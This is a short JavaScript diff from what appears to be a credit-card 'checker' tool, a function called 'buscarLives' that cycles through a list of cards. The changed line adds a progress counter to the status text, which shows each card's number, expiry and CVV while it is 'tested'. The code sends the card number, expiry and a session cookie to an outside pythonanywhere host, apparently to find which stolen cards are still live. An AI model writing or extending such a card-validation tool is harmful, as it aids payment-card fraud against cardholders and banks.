@@ -177,7 +177,7 @@ async function buscarLives(){
     document.querySelector(".loading").style.display = "block";
 
     for(let i = 0; i < tarjetas.length; ++i){
-        pEstado.textContent = "Probando: " + tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv;
+        pEstado.textContent = "Probando ("+(i+1)+"/"+tarjetas.length+"): " + tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv;
 
         let url = `https://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}`;
         
